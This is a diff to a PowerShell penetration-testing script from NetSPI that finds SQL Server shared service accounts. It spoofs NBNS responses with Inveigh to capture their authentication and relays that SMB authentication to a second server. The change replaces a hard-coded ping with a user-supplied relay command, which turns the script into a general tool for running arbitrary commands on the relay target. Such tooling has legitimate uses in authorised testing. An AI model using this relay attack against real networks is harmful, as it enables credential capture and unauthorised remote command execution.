@@ -1,6 +1,6 @@
 # author: scott sutherland (@_nullbind), NetSPI 2016
 # script name: Get-SQLSharedAccountPwHash.ps1
-# requirements: import powerupsql;import invoke-inveigh
+# requirements: import-module powerupsql.psm1 (https://github.com/nullbind/Powershellery/blob/master/Stable-ish/MSSQL/PowerUpSQL.psm1);import-module invoke-inveigh.ps1;import-module Inveigh-Relay.ps1 (https://github.com/Kevin-Robertson/Inveigh)
 # Note: use for alt domain user: runas /noprofile /netonly /user:domain\users powershell.exe
 # Example: .\Get-SQLSharedAccountPwHash.ps1 -username domain\user -password SuperPassword! -domaincontroller 10.0.0.1
 
@@ -19,10 +19,13 @@ Param(
    [string]$relayip,
 
    [Parameter(Mandatory=$false)]
+   [string]$relaycommand,
+
+   [Parameter(Mandatory=$false)]
    [int]$timeout = 5
 )
 
-
+ 
 #-----------------
 # discover shared accounts here
 #-----------------
@@ -99,7 +102,9 @@ if(-not $x){
             # sniff and set relay target to target2
             Write-Output "$sharedaccount : Starting sniffer"
             if($relayip){
-                Invoke-Inveigh -SMBRelay Y -SMBRelayTarget $target2ip -SMBRelayCommand "ping  10.0.0.247" -SpooferHostsReply $target1 -NBNS Y | Out-Null 
+                
+                # need to check for command here
+                Invoke-Inveigh -SMBRelay Y -SMBRelayTarget $target2ip -SMBRelayCommand "$relaycommand" -SpooferHostsReply $target1 -NBNS Y | Out-Null 
             }else{
                 Invoke-Inveigh -SpooferHostsReply $target1 -NBNS Y | Out-Null 
             }
